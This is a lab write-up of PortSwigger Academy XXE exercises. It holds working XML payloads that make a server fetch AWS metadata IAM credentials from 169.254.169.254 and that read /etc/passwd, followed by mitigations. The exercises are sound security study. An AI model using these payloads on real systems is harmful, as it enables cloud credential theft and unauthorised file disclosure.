
# XXE Exploitation Notes (Lab-Based, Ongoing)

## 📌 Overview
This repository documents **hands-on security lab exercises** focused on exploiting
**XML External Entity (XXE)** vulnerabilities and demonstrating how they can escalate into
more severe issues such as **SSRF** and **cloud metadata exposure**.

All exploitation shown here was performed in a **legal, intentionally vulnerable lab**
(PortSwigger Web Security Academy).

This is a **living report** — additional tasks and techniques will be added over time.

---

## Core Attack Flow (Who Does What)

```

YOU
└─(XXE payload)─▶ VULNERABLE SERVER
└─(SSRF request)─▶ AWS METADATA
└─(data)─▶ SERVER
└─(error message)─▶ YOU

````

### Important Clarification
- **XXE** → performed by **YOU** (malicious XML input)
- **SSRF** → performed by the **vulnerable server**
- **AWS Metadata** → internal cloud service abused as a result

---

## Common Lab Context

- Endpoint: `/product/stock`
- Method: `POST`
- Content-Type: `application/xml`
- Misconfigurations:
  - External entities enabled
  - DTD processing allowed
  - Parser errors reflected in responses

---

## Task 1 — XXE → SSRF → AWS Metadata

### Goal
Use XXE to force the server to make **internal HTTP requests** to the AWS EC2
Instance Metadata Service.

---

### Payloads Used (Step-by-Step)

#### 1️⃣ Initial metadata probe
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockcheck [
  <!ENTITY data SYSTEM "http://169.254.169.254/">
]>
<stockCheck>
  <productId>&data;</productId>
  <storeId>1</storeId>
</stockCheck>
````

**Result:**
Server error response leaked:

```
latest
```

---

#### 2️⃣ Traverse metadata paths

```xml
<!DOCTYPE stockcheck [
  <!ENTITY data SYSTEM "http://169.254.169.254/latest">
]>
```

**Result:**
Leaked:

```
meta-data
```

---

#### 3️⃣ Access IAM role credentials

```xml
<!DOCTYPE stockcheck [
  <!ENTITY data SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
```

**Result:**
Server returned IAM role credentials in the error message, including:

* AccessKeyId
* SecretAccessKey
* Session Token
* Expiration

> ⚠️ Credentials were lab-generated and are not reused or stored.

---

### Why This Works

* `169.254.169.254` is a **link-local IP**
* Accessible only from inside the EC2 instance
* The XML parser resolves the entity and the **server makes the request**
* This is **SSRF triggered via XXE**

---

## 🔓 Task 2 — XXE → Local File Disclosure

### Goal

Read arbitrary files from the server filesystem using XXE.

---

### Payload Used

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockcheck [
  <!ENTITY data SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&data;</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### Result

* Contents of `/etc/passwd` returned in the response
* Confirms:

  * External entities enabled
  * Local file access allowed
  * Unsafe error handling

---

## 🔥 Impact Summary (So Far)

* Arbitrary local file read
* Internal network access
* Cloud metadata exposure
* Potential cloud account compromise

Severity in real environments: **High → Critical**

---

## 🛡️ Mitigations (High-Level)

* Disable DTDs where not required
* Disable external entities in XML parsers
* Restrict outbound network access
* Enforce AWS IMDSv2
* Do not reflect parser errors to users

---
